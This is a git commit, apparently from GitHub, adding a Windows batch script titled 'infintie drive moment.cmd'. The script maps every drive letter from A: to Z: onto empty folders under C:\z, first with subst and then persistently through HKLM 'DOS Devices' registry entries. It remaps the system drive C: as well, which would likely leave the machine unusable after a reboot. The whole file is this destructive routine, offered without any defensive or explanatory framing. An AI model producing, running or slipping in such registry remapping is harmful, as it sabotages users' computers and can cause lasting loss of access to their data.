113f4f11e6209f6f2e7ceb9b57092bb5cbd15918
NotJacob <104863027+NotJacobX@users.noreply.github.com>
2026-04-27 14:56:47 +0200

    Add files via upload

---
+++ infintie drive moment.cmd
@@ -0,0 +1,80 @@
+md C:\z
+md C:\z\a
+md C:\z\b
+md C:\z\c
+md C:\z\d
+md C:\z\e
+md C:\z\f
+md C:\z\g
+md C:\z\h
+md C:\z\i
+md C:\z\j
+md C:\z\k
+md C:\z\l
+md C:\z\m
+md C:\z\n
+md C:\z\o
+md C:\z\p
+md C:\z\q
+md C:\z\r
+md C:\z\s
+md C:\z\t
+md C:\z\u
+md C:\z\v
+md C:\z\w
+md C:\z\x
+md C:\z\y
+md C:\z\z
+subst A: C:\z\a
+subst B: C:\z\b
+subst C: C:\z\c
+subst D: C:\z\d
+subst E: C:\z\e
+subst F: C:\z\f
+subst G: C:\z\g
+subst H: C:\z\h
+subst I: C:\z\i
+subst J: C:\z\j
+subst K: C:\z\k
+subst L: C:\z\l
+subst M: C:\z\m
+subst N: C:\z\n
+subst O: C:\z\o
+subst P: C:\z\p
+subst Q: C:\z\q
+subst R: C:\z\r
+subst S: C:\z\s
+subst T: C:\z\t
+subst U: C:\z\u
+subst V: C:\z\v
+subst W: C:\z\w
+subst X: C:\z\x
+subst Y: C:\z\y
+subst Z: C:\z\z
+
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\DOS Devices" /v "A:" /t REG_SZ /d "\\\\??\\C:\\z\\a"
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\DOS Devices" /v "B:" /t REG_SZ /d "\\\\??\\C:\\z\\b"
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\DOS Devices" /v "C:" /t REG_SZ /d "\\\\??\\C:\\z\\c"
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\DOS Devices" /v "D:" /t REG_SZ /d "\\\\??\\C:\\z\\d"
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\DOS Devices" /v "E:" /t REG_SZ /d "\\\\??\\C:\\z\\e"
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\DOS Devices" /v "F:" /t REG_SZ /d "\\\\??\\C:\\z\\f"
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\DOS Devices" /v "G:" /t REG_SZ /d "\\\\??\\C:\\z\\g"
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\DOS Devices" /v "H:" /t REG_SZ /d "\\\\??\\C:\\z\\h"
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\DOS Devices" /v "I:" /t REG_SZ /d "\\\\??\\C:\\z\\i"
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\DOS Devices" /v "J:" /t REG_SZ /d "\\\\??\\C:\\z\\j"
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\DOS Devices" /v "K:" /t REG_SZ /d "\\\\??\\C:\\z\\k"
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\DOS Devices" /v "L:" /t REG_SZ /d "\\\\??\\C:\\z\\l"
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\DOS Devices" /v "M:" /t REG_SZ /d "\\\\??\\C:\\z\\m"
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\DOS Devices" /v "N:" /t REG_SZ /d "\\\\??\\C:\\z\\n"
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\DOS Devices" /v "O:" /t REG_SZ /d "\\\\??\\C:\\z\\o"
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\DOS Devices" /v "P:" /t REG_SZ /d "\\\\??\\C:\\z\\p"
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\DOS Devices" /v "Q:" /t REG_SZ /d "\\\\??\\C:\\z\\q"
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\DOS Devices" /v "R:" /t REG_SZ /d "\\\\??\\C:\\z\\r"
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\DOS Devices" /v "S:" /t REG_SZ /d "\\\\??\\C:\\z\\s"
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\DOS Devices" /v "T:" /t REG_SZ /d "\\\\??\\C:\\z\\t"
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\DOS Devices" /v "U:" /t REG_SZ /d "\\\\??\\C:\\z\\u"
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\DOS Devices" /v "V:" /t REG_SZ /d "\\\\??\\C:\\z\\v"
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\DOS Devices" /v "W:" /t REG_SZ /d "\\\\??\\C:\\z\\w"
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\DOS Devices" /v "X:" /t REG_SZ /d "\\\\??\\C:\\z\\x"
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\DOS Devices" /v "Y:" /t REG_SZ /d "\\\\??\\C:\\z\\y"
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\DOS Devices" /v "Z:" /t REG_SZ /d "\\\\??\\C:\\z\\z"
